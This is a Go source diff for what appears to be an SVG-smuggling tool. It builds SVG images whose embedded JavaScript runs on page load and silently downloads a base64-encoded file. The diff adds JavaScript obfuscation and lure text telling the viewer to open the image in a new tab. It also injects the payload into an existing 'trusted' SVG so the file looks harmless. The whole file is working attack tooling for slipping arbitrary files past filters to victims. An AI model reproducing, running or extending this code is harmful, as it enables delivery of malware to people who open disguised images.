@@ -1,88 +1,110 @@
 package utils
 
 import (
-	"bytes"
 	"fmt"
-	"html/template"
 	"os"
 	"strings"
 )
 
-const svgTemplate = `
-<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
-     version="1.0" width="500" height="500">
+const svgTemplate = `<svg xmlns="http://www.w3.org/2000/svg"
+     xmlns:xlink="http://www.w3.org/1999/xlink"
+     version="1.0"
+     width="500"
+     height="500">
+	 <text x="10" y="40" font-family="Arial" font-size="20" fill="gray">Open this image in a new tab</text>
+%s
+</svg>`
 
-    <script type="application/ecmascript"><![CDATA[
-        document.addEventListener("DOMContentLoaded", function() {
-            function base64ToArrayBuffer(base64) {
-                var binary = window.atob(base64);
-                var len = binary.length;
-                var bytes = new Uint8Array(len);
+const jsTemplate = `document.addEventListener("DOMContentLoaded", function() {
+    function base64ToArrayBuffer(base64) {
+        var binary = window.atob(base64);
+        var len = binary.length;
+        var bytes = new Uint8Array(len);
+        for (var i = 0; i < len; i++) {
+            bytes[i] = binary.charCodeAt(i);
+        }
+        return bytes.buffer;
+    }
+    var file = '%s';
+    var data = base64ToArrayBuffer(file);
+    var blob = new Blob(
+        [data],
+        { type: 'application/octet-stream' }
+    );
+    var a = document.createElementNS(
+        'http://www.w3.org/1999/xhtml',
+        'a'
+    );
+    document.documentElement.appendChild(a);
+    a.style.display = 'none';
+    var url = window.URL.createObjectURL(blob);
+    a.href = url;
+    a.download = '%s';
+    a.click();
+    window.URL.revokeObjectURL(url);
+});`
 
-                for (var i = 0; i < len; i++) {
-                    bytes[i] = binary.charCodeAt(i);
-                }
+// generate basic SVG ==========
+func GenerateSVG(b64string, originalFilename string, obfuscationOptions Options) (string, error) {
 
-                return bytes.buffer;
-            }
+	// inject values before obfuscation
+	rawJS := fmt.Sprintf(
+		jsTemplate,
+		escapeJSString(b64string),
+		escapeJSString(originalFilename),
+	)
 
-            var file = '{{.Base64}}';
-            var data = base64ToArrayBuffer(file);
+	// obfuscator options
+	// options := Options{
+	// 	EncodeStrings:    true,
+	// 	HexEscape:        true,
+	// 	RemoveComments:   true,
+	// 	MinifyCode:       true,
+	// 	AdvancedEncoding: true,
+	// }
 
-            var blob = new Blob([data], {type: 'application/octet-stream'});
-            var a = document.createElementNS('http://www.w3.org/1999/xhtml', 'a');
+	obf := NewObfuscator(obfuscationOptions)
 
-            document.documentElement.appendChild(a);
-            a.style.display = 'none';
+	// obfuscate final JS
+	obfuscatedJS := obf.Obfuscate(rawJS)
 
-            var url = window.URL.createObjectURL(blob);
+	// wrap JS
+	scriptTag := fmt.Sprintf(`
+<script type="application/ecmascript"><![CDATA[
+%s
+]]></script>
+`, obfuscatedJS)
 
-            a.href = url;
-            a.download = '{{.Filename}}';
-            a.click();
+	// build final svg
+	finalSVG := fmt.Sprintf(svgTemplate, scriptTag)
 
-            window.URL.revokeObjectURL(url);
-        });
-    ]]></script>
-</svg>
-`
-
-type svgData struct {
-	Base64   string
-	Filename string
+	return finalSVG, nil
 }
 
-// Generate basic SVG ==========
-func GenerateSVG(b64string, originalFilename string) (string, error) {
-	tmpl, err := template.New("svg").Parse(svgTemplate)
-	if err != nil {
-		return "", fmt.Errorf("%w", err)
-	}
+// inject payload into trusted SVG ==========
+func GenerateTrustedSVG(
+	trustedFile,
+	b64string,
+	originalFilename string,
+	obfuscationOptions Options,
+) (string, error) {
 
-	var buf bytes.Buffer
-
-	data := svgData{
-		Base64:   b64string,
-		Filename: template.JSEscapeString(originalFilename),
-	}
-
-	if err := tmpl.Execute(&buf, data); err != nil {
-		return "", fmt.Errorf("%w", err)
-	}
-
-	return buf.String(), nil
-}
-
-// Inject SVG into trusted SVG ==========
-func GenerateTrustedSVG(trustedFile, b64string, originalFilename string) (string, error) {
-	svgPayload, err := GenerateSVG(b64string, originalFilename)
+	svgPayload, err := GenerateSVG(
+		b64string,
+		originalFilename,
+		obfuscationOptions,
+	)
 	if err != nil {
 		return "", err
 	}
 
 	data, err := os.ReadFile(trustedFile)
 	if err != nil {
-		return "", fmt.Errorf("%w", err)
+		return "", fmt.Errorf(
+			"failed to read trusted SVG '%s': %w",
+			trustedFile,
+			err,
+		)
 	}
 
 	text := string(data)
@@ -97,6 +119,7 @@ func GenerateTrustedSVG(trustedFile, b64string, originalFilename string) (string
 	}
 
 	var builder strings.Builder
+
 	builder.Grow(len(text) + len(svgPayload))
 
 	builder.WriteString(text[:index])
@@ -104,4 +127,19 @@ func GenerateTrustedSVG(trustedFile, b64string, originalFilename string) (string
 	builder.WriteString(text[index:])
 
 	return builder.String(), nil
+}
+
+// escape dangerous JS chars ==========
+func escapeJSString(input string) string {
+
+	replacer := strings.NewReplacer(
+		`\\`, `\\\\`,
+		`'`, `\'`,
+		`"`, `\"`,
+		"\n", `\n`,
+		"\r", `\r`,
+		"</script>", `<\/script>`,
+	)
+
+	return replacer.Replace(input)
 }
